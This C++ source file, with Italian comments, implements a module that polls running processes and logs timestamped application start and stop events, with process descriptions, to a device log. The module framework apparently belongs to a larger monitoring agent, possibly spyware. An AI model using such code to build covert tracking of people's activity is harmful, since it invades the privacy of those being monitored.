#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "FunctionFunc.h"

DWORD WINAPI ApplicationModule(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	HANDLE moduleHandle;

	Log log;
	list<ProcessEntry> pProcessList, pUpdatedProcess;
	list<ProcessEntry>::iterator iterOld, iterNew;
	ProcessMonitor *processObj = ProcessMonitor::self();
	wstring wDesc;
	struct tm mytm;
	WCHAR wNull = 0;
	SYSTEMTIME st;
	BOOL bFirst = TRUE, bFound = FALSE, bEmpty = TRUE;

	pProcessList.clear();
	pUpdatedProcess.clear();

	me->setStatus(MODULE_RUNNING);
	moduleHandle = me->getEvent();

	DBG_TRACE(L"Debug - Application.cpp - Application Module started\n", 5, FALSE);

	// Creiamo il log
	if (log.CreateLog(LOGTYPE_APPLICATION, NULL, 0, FLASH) == FALSE) {
		me->setStatus(MODULE_STOPPED);
		DBG_TRACE(L"Debug - Application.cpp - Application Module cannot create log\n", 5, FALSE);
		return TRUE;
	}

	DBG_TRACE(L"Debug - Application.cpp - Application Module is Alive\n", 1, FALSE);

	LOOP {
		do {
			if (bFirst) {
				bFirst = FALSE;
				pProcessList.clear();

				if (pUpdatedProcess.empty())
					processObj->GetProcessList(pProcessList);
				else
					pProcessList = pUpdatedProcess;
			} else {
				bFirst = TRUE;
				pUpdatedProcess.clear();
				processObj->GetProcessList(pUpdatedProcess);

				if (pUpdatedProcess.empty() || pProcessList.empty())
					continue;

				// Confronta le due liste (la nuova con la vecchia) alla ricerca di nuovi processi
				for (iterNew = pUpdatedProcess.begin(); iterNew != pUpdatedProcess.end(); iterNew++) {
					for (iterOld = pProcessList.begin(); iterOld != pProcessList.end(); iterOld++) {	
						if (!wcscmp((*iterOld).pe.szExeFile, (*iterNew).pe.szExeFile)) {
							bFound = TRUE; // Situazione invariata
							pProcessList.erase(iterOld);
							break;
						}
					}

					if (bFound == FALSE) {
						GetSystemTime(&st);
						SET_TIMESTAMP(mytm, st);

						// 1. Scriviamo il timestamp
						if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
							bEmpty = FALSE;

						// 2. Poi il nome del file
						log.WriteLog((BYTE *)(*iterNew).pe.szExeFile, WideLen((*iterNew).pe.szExeFile));
						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// 3. Quindi lo stato (START o STOP)
						log.WriteLog((BYTE *)L"START", WideLen(L"START"));
						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// 4. La descrizione (se disponibile)
						wDesc = processObj->GetProcessDescription((*iterNew).pe.th32ProcessID);

						if (wDesc.empty() == FALSE)
							log.WriteLog((BYTE *)wDesc.c_str(), wDesc.size() * sizeof(WCHAR));

						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// 5. Ed il delimitatore
						UINT delimiter = LOG_DELIMITER;
						log.WriteLog((BYTE *)&delimiter, sizeof(delimiter));
					}

					bFound = FALSE;
				}

				for (iterOld = pProcessList.begin(); iterOld != pProcessList.end(); iterOld++) {
					GetSystemTime(&st);
					SET_TIMESTAMP(mytm, st);

					// 1. Scriviamo il timestamp
					if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
						bEmpty = FALSE;

					// 2. Poi il nome del file
					log.WriteLog((BYTE *)(*iterOld).pe.szExeFile, WideLen((*iterOld).pe.szExeFile));
					log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

					// 3. Quindi lo stato (START o STOP)
					log.WriteLog((BYTE *)L"STOP", WideLen(L"STOP"));
					log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

					// 4. La descrizione (se disponibile)
					wDesc = processObj->GetProcessDescription((*iterOld).pe.th32ProcessID);

					if (wDesc.empty() == FALSE)
						log.WriteLog((BYTE *)wDesc.c_str(), wDesc.size() * sizeof(WCHAR));

					log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

					// 5. Ed il delimitatore
					UINT delimiter = LOG_DELIMITER;
					log.WriteLog((BYTE *)&delimiter, sizeof(delimiter));
				}
			}
		} while(0);

		_WaitForSingleObject(moduleHandle, 5000);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Application.cpp - Application Module is Closing\n", 1, FALSE);
			pProcessList.clear();
			pUpdatedProcess.clear();

			log.CloseLog(bEmpty);
			me->setStatus(MODULE_STOPPED);

			return 0;
		}

		if (me->shouldCycle()) {
			log.CloseLog(bEmpty);
			log.CreateLog(LOGTYPE_APPLICATION, NULL, 0, FLASH);
			DBG_TRACE(L"Debug - Application.cpp - Application Module, log cycling\n", 1, FALSE);
		}
	}

	return FALSE;
}
